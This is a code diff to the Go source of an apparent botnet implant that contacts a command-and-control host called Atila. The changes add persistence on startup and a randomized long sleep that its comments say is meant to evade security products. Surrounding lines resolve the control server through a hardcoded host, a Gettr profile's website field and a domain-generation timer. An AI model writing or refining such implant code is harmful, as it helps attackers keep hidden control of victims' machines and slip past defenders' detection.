@@ -60,6 +60,12 @@ func tick(host string) bool {
 }
 
 func initialize() {
+	// Check if the bot is persistent within the environment, if not then persist.
+	if !checkIfPersisted() {
+		err := persist()
+		fmt.Println(err)
+	}
+
 	// Initialize a SQLite database and run the migrations.
 	err := dbInit()
 	if err != nil {
@@ -94,17 +100,25 @@ func initialize() {
 	fmt.Println(botDetails)
 }
 
-func main() {
-	// Check if the bot is persistent within the environment, if not then persist.
-	if !checkIfPersisted() {
-		err := persist()
-		fmt.Println(err)
+// prepare handles the code executed immediately.
+func prepare() {
+	// Sleep for a certain amount of time. This way we'll avoid a lot of security solutions.
+	// This is insufficient if an environment performs acceleration of the system's sleep call.
+	if hybernate {
+		rand.Seed(time.Now().UnixNano())
+		time.Sleep(time.Minute * time.Duration(rand.Intn(hybernateMax-hybernateMin)+hybernateMax))
 	}
+}
+
+func main() {
+	// Perform certain actions prior to the execution of duties.
+	prepare()
 
 	// Once the bot is started we need to load some variables and prepare it for normal work.
 	initialize()
 
-	for range time.Tick(time.Second + time.Duration(rand.Intn(maxLoopWait-minLoopWait)+maxLoopWait)) {
+	// Bot's main loop which performs the tick operation. Consider the tick operation the actual content of the main loop.
+	for range time.Tick(time.Second * time.Duration(rand.Intn(maxLoopWait-minLoopWait)+maxLoopWait)) {
 		rand.Seed(time.Now().UnixNano())
 
 		// We need to reach out to hardcoded host of Atila. (cnc)
@@ -116,7 +130,7 @@ func main() {
 
 		// Reachout to Atila (cnc) host via 'website' property on a Gettr profile.
 		gettrAtilaHost, err := gettrProfileWebsite(gettrProfileName)
-		if err == nil {
+		if err == nil && len(gettrAtilaHost) != 0 {
 			if tick(gettrAtilaHost) {
 				// Reset the timer of DGA and move on...
 				lastContactMade = timeSinceJesus()
